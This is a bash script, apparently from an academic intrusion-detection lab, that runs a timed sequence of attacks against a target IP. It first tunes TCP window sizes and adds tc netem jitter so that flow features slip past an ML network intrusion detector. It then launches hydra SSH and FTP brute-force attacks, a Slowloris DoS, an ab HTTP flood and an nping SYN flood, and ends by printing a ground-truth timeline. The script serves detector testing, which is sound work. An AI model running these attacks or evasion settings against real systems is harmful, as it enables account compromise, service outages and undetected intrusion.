#!/bin/bash
# =============================================================
# NIDS01 Real-Traffic Testing — EVASION Attack (Dengan Perturbasi)
# =============================================================
# Dijalankan di EC2 Attacker
# Usage: ./nids01-attack-evasion.sh <TARGET_IP>
# Output: 5 serangan sequential + evasion techniques, total ~12 menit
#
# Evasion techniques:
#   - TCP Window Size diubah (mempengaruhi Init Fwd Win Byts)
#   - Jitter ditambah via tc netem (mempengaruhi Fwd IAT Std)
#   - Rate yang sedikit berbeda (mempengaruhi Fwd Pkts/s)
# =============================================================

TARGET_IP=${1:-"10.3.2.x"}

if [ "$TARGET_IP" == "10.3.2.x" ]; then
    echo "ERROR: Masukkan IP Target sebagai argument!"
    echo "Usage: ./nids01-attack-evasion.sh 10.3.2.100"
    exit 1
fi

echo "============================================================"
echo "  NIDS01 — EVASION ATTACK SCENARIO (Dengan Perturbasi)"
echo "============================================================"
echo "  Target: $TARGET_IP"
echo "  Start:  $(date '+%Y-%m-%d %H:%M:%S')"
echo "  Durasi: ~12 menit (5 serangan + evasion + warm-up/cool-down)"
echo "============================================================"

# --- Aktifkan Evasion Techniques ---
echo ""
echo "[EVASION] Mengaktifkan perturbasi jaringan..."

# 1. Ubah TCP Window Size (mempengaruhi Init Fwd Win Byts)
echo "  [1] Mengubah TCP window size..."
sudo sysctl -w net.ipv4.tcp_window_scaling=0 > /dev/null 2>&1
sudo sysctl -w net.ipv4.tcp_rmem="4096 16384 32768" > /dev/null 2>&1
sudo sysctl -w net.ipv4.tcp_wmem="4096 16384 32768" > /dev/null 2>&1

# 2. Tambah Jitter/Delay (mempengaruhi Fwd IAT Std, Fwd IAT Tot)
echo "  [2] Menambah jitter 10ms ± 5ms..."
sudo tc qdisc add dev eth0 root netem delay 10ms 5ms distribution normal 2>/dev/null || \
sudo tc qdisc change dev eth0 root netem delay 10ms 5ms distribution normal 2>/dev/null

echo "  [✓] Evasion aktif: TCP window reduced + jitter 10±5ms"
echo ""

# --- Phase 0: Benign Warm-up (1 menit) ---
echo "[$(date +%H:%M:%S)] Phase 0: Benign warm-up (1 min)"
for i in $(seq 1 60); do
    curl -s -o /dev/null http://$TARGET_IP/
    sleep 1
done
echo "  Done."

# --- Phase 1: SSH Brute-Force + Evasion (2 menit) ---
echo ""
echo "[$(date +%H:%M:%S)] Phase 1: SSH Brute-Force + Evasion (2 min)"
# Thread lebih rendah + wait lebih lama → mengubah pola timing
timeout 120 hydra -l testuser -P /opt/attack/passwords.txt -t 2 -w 10 $TARGET_IP ssh 2>&1 | tail -3
echo "  Done."
sleep 5

# --- Phase 2: FTP Brute-Force + Evasion (2 menit) ---
echo ""
echo "[$(date +%H:%M:%S)] Phase 2: FTP Brute-Force + Evasion (2 min)"
timeout 120 hydra -l testuser -P /opt/attack/passwords.txt -t 2 -w 10 $TARGET_IP ftp 2>&1 | tail -3
echo "  Done."
sleep 5

# --- Phase 3: DoS Slowloris + Evasion (2 menit) ---
echo ""
echo "[$(date +%H:%M:%S)] Phase 3: DoS Slowloris + Evasion (2 min)"
# Fewer sockets → mengubah Tot Bwd Pkts pattern
timeout 120 slowloris $TARGET_IP -p 80 -s 50 2>&1 | tail -3
echo "  Done."
sleep 5

# --- Phase 4: DoS HTTP Flood + Evasion (2 menit) ---
echo ""
echo "[$(date +%H:%M:%S)] Phase 4: DoS HTTP Flood + Evasion (2 min)"
# Concurrency lebih rendah + jitter dari netem → pola berbeda
timeout 120 ab -n 15000 -c 50 http://$TARGET_IP/ 2>&1 | tail -5
echo "  Done."
sleep 5

# --- Phase 5: DDoS SYN Flood + Evasion (1 menit, rate lebih rendah) ---
echo ""
echo "[$(date +%H:%M:%S)] Phase 5: DDoS SYN Flood + Evasion (1 min, rate 100/s)"
# Rate lebih rendah + jitter → Fwd Pkts/s dan IAT berubah
sudo timeout 60 nping --tcp --flags SYN --rate 100 -p 80 -c 6000 $TARGET_IP 2>&1 | tail -3
echo "  Done."
sleep 5

# --- Phase 6: Benign Cool-down (1 menit) ---
echo ""
echo "[$(date +%H:%M:%S)] Phase 6: Benign cool-down (1 min)"
for i in $(seq 1 60); do
    curl -s -o /dev/null http://$TARGET_IP/
    sleep 1
done
echo "  Done."

# --- Kembalikan Network Settings ---
echo ""
echo "[EVASION] Mengembalikan network settings..."
sudo sysctl -w net.ipv4.tcp_window_scaling=1 > /dev/null 2>&1
sudo sysctl -w net.ipv4.tcp_rmem="4096 131072 6291456" > /dev/null 2>&1
sudo sysctl -w net.ipv4.tcp_wmem="4096 16384 4194304" > /dev/null 2>&1
sudo tc qdisc del dev eth0 root netem 2>/dev/null
echo "  [✓] Network settings restored"

echo ""
echo "============================================================"
echo "  EVASION ATTACK COMPLETE"
echo "  End: $(date '+%Y-%m-%d %H:%M:%S')"
echo "============================================================"
echo ""
echo "Timeline Ground Truth:"
echo "  Menit 00-01 : Benign (warm-up) + Evasion Active"
echo "  Menit 01-03 : SSH Brute-Force (evasion: low-thread + jitter)"
echo "  Menit 03-05 : FTP Brute-Force (evasion: low-thread + jitter)"
echo "  Menit 05-07 : DoS Slowloris (evasion: fewer sockets + jitter)"
echo "  Menit 07-09 : DoS HTTP Flood (evasion: low-concurrency + jitter)"
echo "  Menit 09-10 : DDoS SYN Flood (evasion: low-rate + jitter)"
echo "  Menit 10-11 : Benign (cool-down)"
echo ""
echo "Evasion yang diterapkan:"
echo "  - TCP window: 32768 (reduced dari 65535)"
echo "  - Jitter: 10ms ± 5ms (tc netem)"
echo "  - Rate/concurrency: dikurangi 50% (mengubah pola traffic)"
echo ""
echo "Next: Analyzer → stop capture → extract → inference"
